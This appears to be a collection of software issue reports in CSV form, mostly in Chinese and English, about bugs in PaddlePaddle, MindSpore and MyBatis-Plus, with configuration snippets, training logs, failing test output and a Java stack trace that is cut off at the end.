Why l1weight has impact on convergence while sgd optimization was used.,"Generally, l1weigh is specified for owlqn, but with setting above, l1weigh indeed has influence on convergence . With l1weight=0.1 With l1weigh=0.1 is removed: need more TEST to verify this conclusion...   <code>: settings( #learning_rate_decay_a = 1e-05, #learning_rate_decay_b = 0.0, learning_rate = 0.1, batch_size = batch_size, algorithm = 'sgd', #l1weight=0.1, #num_batches_per_send_parameter = 1, learning_method = 'rmsprop', ) I /home/wangyanfei/baidu/idl/paddle/paddle/trainer/Tester.cpp:111] Test samples=10877807 cost=0.0634097 Eval: __auc_evaluator_0__=0.641067 ..............I /home/wangyanfei/baidu/idl/paddle/paddle/trainer/TrainerInternal.cpp:179] Pass=0 Batch=1094 samples=43721520 AvgCost=0.0665462 Eval: __auc_evaluator_0__=0.620773 I /home/wangyanfei/baidu/idl/paddle/paddle/trainer/Tester.cpp:111] Test samples=10877807 cost=0.0635014 Eval: __auc_evaluator_0__=0.634032 I /home/wangyanfei/baidu/idl/paddle/paddle/trainer/Tester.cpp:111] Test samples=10877807 cost=0.0629021 Eval: __auc_evaluator_0__=0.65267 ..............I /home/wangyanfei/baidu/idl/paddle/paddle/trainer/TrainerInternal.cpp:179] Pass=0 Batch=1094 samples=43721520 AvgCost=0.0658823 Eval: __auc_evaluator_0__=0.619865 I /home/wangyanfei/baidu/idl/paddle/paddle/trainer/Tester.cpp:111] Test samples=10877807 cost=0.0640271 Eval: __auc_evaluator_0__=0.600817"
动态表名如何针对大于、小于等场景进行策略处理,"当前使用版本 实现ITableNameHandler接口后，能根据入参，sql等进行解析动态表名，但如果在delete等场景中，会返回多表名的处理链。 比如我想实现一个位置表location（userid，loctionid，time），并实现为按月进行存储，但我在删除操作中，比如:，这里可能会存在多个表名返回，比如大于3月，则我希望能返回的是location_202004,location_202003 无法实现   <code>: &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.3.1.tmp&lt;/version&gt; &lt;/dependency&gt; delete from location where daytime &gt;#{date}"
Quant2 procedure not working properly on Quant1 ResNet50/101 models,"When applying the to the Qat1 ResNet50/101 model, INT8 accuracy of the first iteration is correct, but iterations &gt; 1 give broken (usually 0.0) accuracy. FP32 accuracy of all the iterations on the same data is correct. INT8 accuracy for MobileNetV1/2 is fine. This suggest some oneDNN (MKL-DNN, DNNL) caching problem, possibly with conv2d's residual data. System information -PaddlePaddle version: feba131 -CPU -oneDNN: from Paddle -OS Platform: Ubuntu 16.04.5 LTS -Python version: from Paddle To Reproduce build Paddle with tests, run the command in the build directory: get the test command from the beginning of the output of the above command and change the option value to a path to the ResNet50 QAT1 model () run the modified command. Describe your current behavior INT8 accuracy of the first iteration is correct, the second iteration gives wrong accuracy (close to 0.0).   <code>: Qat2Int8MkldnnPass ctest -R test_qat2_int8_resnet50_mkldnn -V --qat_model build/third_party/inference_demo/qat/ResNet50_QAT/model/"
[ST][MS][NET][bert-base][gpu 1p]FPS[278] can not reach 310,"bert-base网络在GPU环境1p训练，性能278/fps达不到310 / 硬件环境: /device GPU : -- MindSpore version :r2.0 commit_id:86e09672 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221103121545 r2.0 commit_id:86e09672 (/): /mode graph test_ms_bert_base_cn_news_train_check_perf_gpu_1p_0002.py cd solution_test/cases/02network/02nlp/bert/train pytest -s test_ms_bert_base_cn_news_train_check_perf_gpu_1p_0002.py 网络训练成功，性能能达到310/fps 走给何茂华   <code>: Train epoch time: 171731.427 ms, per step time: 8586.571 ms Train epoch time: 2206.404 ms, per step time: 110.320 ms Train epoch time: 2247.044 ms, per step time: 112.352 ms Train epoch time: 2231.385 ms, per step time: 111.569 ms Train epoch time: 2323.133 ms, per step time: 116.157 ms Train epoch time: 2323.616 ms, per step time: 116.181 ms Train epoch time: 2346.531 ms, per step time: 117.327 ms Train epoch time: 2239.107 ms, per step time: 111.955 ms Train epoch time: 2282.722 ms, per step time: 114.136 ms Train epoch time: 2300.213 ms, per step time: 115.011 ms Train epoch time: 2318.062 ms, per step time: 115.903 ms Train epoch time: 2315.956 ms, per step time: 115.798 ms Train epoch time: 2323.417 ms, per step time: 116.171 ms Train epoch time: 2308.810 ms, per step time: 115.440 ms Train epoch time: 2236.311 ms, per step time: 111.816 ms Train epoch time: 2293.870 ms, per step time: 114.693 ms Train epoch time: 2306.563 ms, per step time: 115.328 ms Train epoch time: 2248.663 ms, per step time: 112.433 ms Train epoch time: 2249.792 ms, per step time: 112.490 ms Train epoch time: 2259.142 ms, per step time: 112.957 ms Train epoch time: 2302.112 ms, per step time: 115.106 ms Train epoch time: 2258.629 ms, per step time: 112.931 ms Train epoch time: 2303.579 ms, per step time: 115.179 ms Train epoch time: 2277.755 ms, per step time: 113.888 ms Train epoch time: 2286.429 ms, per step time: 114.321 ms Train epoch time: 2318.018 ms, per step time: 115.901 ms Train epoch time: 2327.904 ms, per step time: 116.395 ms Train epoch time: 2320.305 ms, per step time: 116.015 ms Train epoch time: 2238.216 ms, per step time: 111.911 ms Train epoch time: 2297.975 ms, per step time: 114.899 ms Train epoch time: 2316.925 ms, per step time: 115.846 ms Train epoch time: 2335.149 ms, per step time: 116.757 ms Train epoch time: 2286.568 ms, per step time: 114.328 ms Train epoch time: 2268.997 ms, per step time: 113.450 ms Train epoch time: 2315.828 ms, per step time: 115.791 ms Train epoch time: 2307.180 ms, per step time: 115.359 ms Train epoch time: 2291.689 ms, per step time: 114.584 ms Train epoch time: 2303.885 ms, per step time: 115.194 ms Train epoch time: 2361.470 ms, per step time: 118.073 ms Train epoch time: 2334.375 ms, per step time: 116.719 ms Train epoch time: 2315.834 ms, per step time: 115.792 ms Train epoch time: 2337.966 ms, per step time: 116.898 ms Train epoch time: 2306.936 ms, per step time: 115.347 ms Train epoch time: 2320.282 ms, per step time: 116.014 ms Train epoch time: 2316.347 ms, per step time: 115.817 ms Train epoch time: 2275.780 ms, per step time: 113.789 ms Train epoch time: 2261.224 ms, per step time: 113.061 ms Train epoch time: 2272.489 ms, per step time: 113.624 ms Train epoch time: 2381.083 ms, per step time: 119.054 ms Train epoch time: 2277.069 ms, per step time: 113.853 ms"
[CT][MS][Unflatten] The document and testcase of Unflatten need modify.,"The document and testcase of Unflatten need modify The document and testcase of Unflatten need modify. 代码中的资料： summary部分，不能写的和标杆完全一样 args部分，接口的属性和输入分开来。 raises部分，”If is either tuple of ints or list of ints.” either是不是应该为neither 另外，输入和参数之间的值的约束，需要体现在属性和输入的描述，或者raises部分 设计文档： 最好把三个平台实际支持的数据类型列出来，文档里面写的是mstype.number_type，那为什么用例只有float16和float32 用例部分： ops文件，一定要按照模板写，先写Unflatten类，继承Cell类。之后正向反向调用Unflatten类。 test文件，要有异常用例，检验一下不支持的数据类型，shape，和取值。 用例的数值，要用np.random.randn(1,1,1,1);np.random.randint(-100,100,size=(1,1,1))这样的方式来随机生成。也可以根据实际的数值约束调整，但应尽量使用随机方法。   <code>: unflattened_size"
[ST][MS][OPS][applyadamwithamsgrad][GPU]pynative模式下动态shape计算结果为0,"性能用例 TypeError: can only concatenate str (not ""float"") to str / 硬件环境: /device GPU : -- MindSpore version : commit_id = ''[sha1]:d880705e,[branch]:(HEAD,origin/r1.8,r1.8)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative dynamic_shape_operations/test_dynamic_shape_applyadamwithamsgrad.py::test_applyadamwithamsgrad_1d_float32 dynamic_shape_operations/test_dynamic_shape_applyadamwithamsgrad.py::test_applyadamwithamsgrad_3d_float32 dynamic_shape_operations/test_dynamic_shape_applyadamwithamsgrad.py::test_applyadamwithamsgrad_5d_float32 计算正确   <code>: _____________________________________________________________ test_applyadamwithamsgrad_5d_float32 ______________________________________________________________ @Author('lhc00657748') @Level2 @SKIP_ENV_DAVINCI_EXECUTOR() def test_applyadamwithamsgrad_5d_float32(): var = Parameter(Tensor(np.random.randn(4, 4, 4, 4, 4)).astype(np.float32), name=""var"") m = Parameter(Tensor(np.random.randn(4, 4, 4, 4, 4)).astype(np.float32), name=""m"") v = Parameter(Tensor(np.random.randn(4, 4, 4, 4, 4)).astype(np.float32), name=""v"") vhat = Parameter(Tensor(np.random.randn(4, 4, 4, 4, 4)).astype(np.float32), name=""vhat"") beta1_power = Tensor(np.random.randn(), dtype=mstype.float32) beta2_power = Tensor(np.random.randn(), dtype=mstype.float32) lr = Tensor(np.random.randn(), dtype=mstype.float32) grad = Tensor(np.random.randn(4, 4, 4, 4, 4), dtype=mstype.float32) indices = np.array([0, 1, 2, 3]) fact = ApplyAdamWithAmsgradMock( attributes={'beta1': 0.0, 'beta2': 0.0, 'epsilon': 0.0, 'use_locking': False}, inputs=[var, m, v, vhat, beta1_power, beta2_power, lr, grad, indices], loss=0.0001) &gt; fact.forward_cmp() dynamic_shape_operations/test_dynamic_shape_applyadamwithamsgrad.py:284: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ dynamic_shape_operations/test_dynamic_shape_applyadamwithamsgrad.py:137: in forward_cmp allclose_nparray(out_tf[0], out_mindspore[0], self.loss, self.loss) share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[[ 1.87961709e+00, 6.53266847e-01, 1.61351109e+00, -1.84496850e-01], [-7.49390423e-01,...945e-01], [ 8.61932039e-01, -6.04410589e-01, 5.30114949e-01, -6.97062552e-01]]]]], dtype=float32) data_me = array([[[[[0., 0., 0., 0.], [0., 0., 0., 0.], [0., 0., 0., 0.], [0., 0., 0., 0.]], ...0., 0., 0., 0.], [0., 0., 0., 0.], [0., 0., 0., 0.], [0., 0., 0., 0.]]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[ 1.8796171 0.65326685 1.6135111 ... -0.6044106 0.53011495 E -0.69706255] E data_me_error:[0. 0. 0. ... 0. 0. 0.] E loss:[1.8796171 0.65326685 1.6135111 ... 0.6044106 0.53011495 0.69706255] share/utils.py:24: AssertionError"
YOLOv3 ResNet50_vd DCN模型C  服务端测试数据异常,"1）PaddlePaddle版本：2.0.1发布板 2）CPU：使用https://www.paddlepaddle.org.cn/documentation/docs/zh/guides/05_inference_deployment/inference/build_and_install_lib_cn.html链接中下载的ubuntu14.04_cuda11_cudnn8_avx_mkl_trt7_gcc82（预测库(2.0.2版本)）自带的数学库 3）GPU：P4卡，cudnn-8.0, cuda11, TensorRT7.2.2.3 4）系统环境：gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04) -预测信息 1）C++预测：使用已经编译好的离线包 https://www.paddlepaddle.org.cn/documentation/docs/zh/guides/05_inference_deployment/inference/build_and_install_lib_cn.html ubuntu14.04_cuda11_cudnn8_avx_mkl_trt7_gcc82（预测库(2.0.2版本)） 2）使用测试demo为PaddleDetection-release-2.0-rc/deploy/cpp 3) cmake参数信息 WITH_GPU=ON WITH_MKL=ON USE_PADDLE_20RC1=OFF(打开或关闭对结果无影响) WITH_STATIC_LIB=OFF 其余路径信息均按照系统中位置填写 说明：1.opencv自动下载的无法正常编译通过，通过apt-get 安装opencv4，手动修改cmakelist文件通过编译 2.原始cmake文件中会引用fluid_inference库，会导致错误（下载包中没），手动修改为paddle_inferenc库 -具体错误描述 第一步：在官方网站（https://www.paddlepaddle.org.cn/modelbasedetail/yolov3）下载了YOLOv3 ResNet50_vd DCN模型 第二步：使用tools/export_model.py导出模型 第三步：编译cpp下的测试demo，执行./build/main 测试benchmark 测试结果：耗时60ms，这比官方的给的P4平台上的35.2ms都慢，请具体告知异常原因。 补充：增加--run_mode=trt_fp32参数后，测试数据为28.6ms，虽然初步达到预期，但是与P4平台上的加速比差别较大，请分析下这组数据是否合理： P4平台：原始数据/tensorRT-FP32 74.4/35.2 = 2.11 T4平台：原始数据/tensorRT-FP32 39.5/28.6 = 1.38 T平台上fluid模式60ms，trt_fp32模式下28.6毫秒 问题： fluid模式比原始模型慢是什么原因？ trt_fp32模式是不是调用TensorRT的模式？   <code>: root@1aeca2c06129:/data/tianhz/PaddleDetection-release-2.0-rc/deploy/cpp# ./build/main --model_dir=/data/tianhz/PaddleDetection-release-2.0-rc/output1/yolov3_r50vd_dcn_db_iouloss_obj365_pretrained_coco --image_path=/data/tianhz/000000000139.jpg --use_gpu=1 --run_benchmark=1 WARNING: Logging before InitGoogleLogging() is written to STDERR W0415 20:48:03.580025 29627 analysis_predictor.cc:1145] Deprecated. Please use CreatePredictor instead. Inference: 61.850891 ms per batch image root@1aeca2c06129:/data/tianhz/PaddleDetection-release-2.0-rc/deploy/cpp#"
[ST][pynative][MS][NET]bert-thor][910 8p]RuntimeError: Param num:4 not match inputs num 3,"bert-thor网络使用pynative模式在910环境8p训练失败 / 硬件环境: /device ascend : -- MindSpore version :r1.8 commit_id:f782fb2e -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C82/20220714 MindSpore 版本：编译时间20220725181608 r1.8.0 commit_id:f782fb2e (/): /mode pynative test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative.py cd solution_test/cases/02network/02nlp/bert_thor/pynative pytest -s test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative.py 网络使用pynative模式训练成功 走给褚金锦   <code>: [CRITICAL] OPTIMIZER(13553,ffff7b675480,python):2022-07-27-15:42:04.286.424 [mindspore/ccsrc/frontend/optimizer/ad/prim_bprop_optimizer.cc:288] BindAbsToParameters] Param num:4 not match inputs num 3 Traceback (most recent call last): File ""/home/zjc/workspace/solution_test/cases/02network/02nlp/bert_thor/train/test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative/run_pretrain.py"", line 271, in &lt;module&gt; run_pretrain() File ""/home/zjc/workspace/solution_test/cases/02network/02nlp/bert_thor/train/test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative/src/model_utils/moxing_adapter.py"", line 109, in wrapped_func run_func(*args, **kwargs) File ""/home/zjc/workspace/solution_test/cases/02network/02nlp/bert_thor/train/test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative/run_pretrain.py"", line 266, in run_pretrain dataset_sink_mode=(cfg.enable_data_sink == ""true""), sink_size=cfg.data_sink_steps) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1069, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 96, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 622, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/train_thor/model_thor.py"", line 248, in _train_dataset_sink_process run_context) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/train_thor/model_thor.py"", line 187, in _train_ascend_sink_step outputs = self._train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 605, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 601, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 419, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/dataset_helper.py"", line 104, in construct return self.network(*outputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 605, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 601, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 419, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/cases/02network/02nlp/bert_thor/train/test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative/src/bert_for_pre_training.py"", line 308, in construct masked_lm_weights) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 605, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 601, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 419, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/cases/02network/02nlp/bert_thor/train/test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative/src/bert_for_pre_training.py"", line 256, in construct self.bert(input_ids, input_mask, token_type_id, masked_lm_positions) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 605, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 601, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 419, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/cases/02network/02nlp/bert_thor/train/test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative/src/bert_for_pre_training.py"", line 170, in construct self.bert(input_ids, token_type_id, input_mask) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 605, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 601, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 419, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zjc/workspace/solution_test/cases/02network/02nlp/bert_thor/train/test_ms_bert_thor_mlperf_train_infer_ascend_8p_0001_pynative/src/bert_model.py"", line 823, in construct word_embeddings = self.bert_embedding_lookup(input_ids) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 605, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 601, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 419, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/layer/thor_layer.py"", line 644, in construct output_for_reshape = self.getG(output_for_reshape) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 294, in __call__ return _run_op(self, self.name, args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 95, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 748, in _run_op output = real_run_op(obj, op_name, args) RuntimeError: Param num:4 not match inputs num 3 ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/frontend/optimizer/ad/prim_bprop_optimizer.cc:288 BindAbsToParameters"
"服务器上 使用自带的分页selectPage(Page<User> page, QueryWrapper<User> wrapper)报错","当前使用版本 jdk1.8 mybatis-plus 3.2.0 写了一个简单的单表分页方法，在idea运行没问题，打jar包之后运行报错。 上面是主要代码 根据我写了的两个方法分析，错误出现在 这两行代码，因为我另写了一个方法未使用这种方式。   <code>: QueryWrapper&lt;User&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.lambda().like(User::getNikeName,name); 2019-12-09 14:42:57.695 |-ERROR [http-nio-8088-exec-7] org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/].[dispatcherServlet] [175] -| Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.builder.BuilderException: Error evaluating expression 'ew.sqlSegment != null and ew.sqlSegment != '' and ew.nonEmptyOfWhere'. Cause: org.apache.ibatis.ognl.OgnlException: sqlSegment [com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: This is impossible to happen]] with root cause java.lang.ClassNotFoundException: com.secret.bussiness.biz.controller.UserController at java.net.URLClassLoader.findClass(URLClassLoader.java:382) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:349) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java.lang.Class.forName0(Native Method) at java.lang.Class.forName(Class.java:348) at java.io.ObjectInputStream.resolveClass(ObjectInputStream.java:686) at com.baomidou.mybatisplus.core.toolkit.support.SerializedLambda$1.resolveClass(SerializedLambda.java:63) at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1868) at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1751) at java.io.ObjectInputStream.readClass(ObjectInputStream.java:1716) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1556) at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2287) at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2211) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2069) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1573) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:431) at com.baomidou.mybatisplus.core.toolkit.support.SerializedLambda.resolve(SerializedLambda.java:67) at com.baomidou.mybatisplus.core.toolkit.LambdaUtils.lambda$resolve$0(LambdaUtils.java:64) at java.util.Optional.orElseGet(Optional.java:267) at com.baomidou.mybatisplus.core.toolkit.LambdaUtils.resolve(LambdaUtils.java:63) at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:72) at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:68) at com.baomidou.mybatisplus.core.conditions.AbstractLambdaWrapper.columnToString(AbstractLambdaWrapper.java:39) at com.baomidou.mybatisplus.core.conditions.AbstractWrapper.lambda$likeValue$17384082$1(AbstractWrapper.java:320) at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193) at java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1382) at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:482) at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:472) at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:708) at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) at java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:499) at com.baomidou.mybatisplus.core.conditions.segments.NormalSegmentList.childrenSqlSegment(NormalSegmentList.java:89) at com.baomidou.mybatisplus.core.conditions.segments.AbstractISegmentList.getSqlSegment(AbstractISegmentList.java:102) at com.baomidou.mybatisplus.core.conditions.segments.MergeSegments.getSqlSegment(MergeSegments.java:72) at com.baomidou.mybatisplus.core.conditions.AbstractWrapper.getSqlSegment(AbstractWrapper.java:432) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.ibatis.ognl.OgnlRuntime.invokeMethod(OgnlRuntime.java:881) at org.apache.ibatis.ognl.OgnlRuntime.getMethodValue(OgnlRuntime.java:1691) at org.apache.ibatis.ognl.ObjectPropertyAccessor.getPossibleProperty(ObjectPropertyAccessor.java:60) at org.apache.ibatis.ognl.ObjectPropertyAccessor.getProperty(ObjectPropertyAccessor.java:147) at org.apache.ibatis.ognl.OgnlRuntime.getProperty(OgnlRuntime.java:2719) at org.apache.ibatis.ognl.ASTProperty.getValueBody(ASTProperty.java:114) at org.apache.ibatis.ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212) at org.apache.ibatis.ognl.SimpleNode.getValue(SimpleNode.java:258) at org.apache.ibatis.ognl.ASTChain.getValueBody(ASTChain.java:141) at org.apache.ibatis.ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212) at org.apache.ibatis.ognl.SimpleNode.getValue(SimpleNode.java:258) at org.apache.ibatis.ognl.ASTNotEq.getValueBody(ASTNotEq.java:50) at org.apache.ibatis.ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212) at org.apache.ibatis.ognl.SimpleNode.getValue(SimpleNode.java:258) at org.apache.ibatis.ognl.ASTAnd.getValueBody(ASTAnd.java:61) at org.apache.ibatis.ognl.SimpleNode.evaluateGetValueBody(SimpleNode.java:212) at org.apache.ibatis.ognl.SimpleNode.getValue(SimpleNode.java:258) at org.apache.ibatis.ognl.Ognl.getValue(Ognl.java:493) at org.apache.ibatis.ognl.Ognl.getValue(Ognl.java:457) at org.apache.ibatis.scripting.xmltags.OgnlCache.getValue(OgnlCache.java:46) at org.apache.ibatis.scripting.xmltags.ExpressionEvaluator.evaluateBoolean(ExpressionEvaluator.java:32) at org.apache.ibatis.scripting.xmltags.IfSqlNode.apply(IfSqlNode.java:34) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.lambda$apply$0(MixedSqlNode.java:32) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.apply(MixedSqlNode.java:32) at org.apache.ibatis.scripting.xmltags.TrimSqlNode.apply(TrimSqlNode.java:55) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.lambda$apply$0(MixedSqlNode.java:32) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.apply(MixedSqlNode.java:32) at org.apache.ibatis.scripting.xmltags.IfSqlNode.apply(IfSqlNode.java:35) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.lambda$apply$0(MixedSqlNode.java:32) at java.util.ArrayList.forEach(ArrayList.java:1257) at org.apache.ibatis.scripting.xmltags.MixedSqlNode.apply(MixedSqlNode.java:32) at org.apache.ibatis.scripting.xmltags.DynamicSqlSource.getBoundSql(DynamicSqlSource.java:39) at org.apache.ibatis.mapping.MappedStatement.getBoundSql(MappedStatement.java:297) at org.apache.ibatis.executor.CachingExecutor.query(CachingExecutor.java:81) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:147) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:140) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:426) at com.sun.proxy.$Proxy63.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:223) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.executeForIPage(MybatisMapperMethod.java:115) at com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:86) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:61) at com.sun.proxy.$Proxy64.selectPage(Unknown Source) at com.secret.bussiness.biz.service.impl.UserServiceImpl.selectPage(UserServiceImpl.java:42) at com.secret.bussiness.biz.service.impl.UserServiceImpl$$FastClassBySpringCGLIB$$22fb72c2.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:684) at com.secret.bussiness.biz.service.impl.UserServiceImpl$$EnhancerBySpringCGLIB$$ed61fa24.selectPage(&lt;generated&gt;) at com.secret.bussiness.biz.controller.UserController.selectPage(UserController.java:86) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at 